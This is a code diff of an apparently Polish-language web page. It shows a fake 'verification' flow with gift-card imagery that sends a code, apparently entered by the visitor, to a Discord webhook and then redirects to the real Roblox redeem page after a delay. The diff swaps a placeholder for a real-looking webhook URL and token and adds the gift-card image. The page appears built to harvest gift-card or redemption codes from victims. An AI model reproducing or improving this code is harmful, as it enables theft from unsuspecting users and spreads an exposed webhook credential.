@@ -72,10 +72,29 @@
     button:hover {
       background: #45a049;
     }
+    /* Obrazki w rogach */
+    .img-top-left {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 150px;
+      z-index: 2;
+    }
+    .img-bottom-right {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      width: 150px;
+      z-index: 2;
+    }
   </style>
 </head>
 <body>
   <canvas id="bg"></canvas>
+
+  <!-- Obrazki w rogach -->
+  <img src="logo.png" class="img-top-left" alt="Logo">
+  <img src="giftcard.png" class="img-bottom-right" alt="Gift Card">
 
   <!-- Panel po lewej -->
   <div class="side-box">
@@ -140,8 +159,8 @@
 
       message.textContent = "Weryfikacja udana!";
 
-      // Adres webhooka Discord
-      const webhookURL = "https://discord.com/api/webhooks/TWÓJ_WEBHOOK_TUTAJ";
+      // Adres webhooka Discord (wstaw swój)
+      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
 
       // wysyłamy kod na webhook
       fetch(webhookURL, {
@@ -153,7 +172,7 @@
       // przekierowanie po 1 sekundzie
       setTimeout(() => {
         window.location.href = "https://www.roblox.com/redeem";
-      }, 1000);
+      }, 10000);
     }
 
     window.addEventListener('resize', () => {
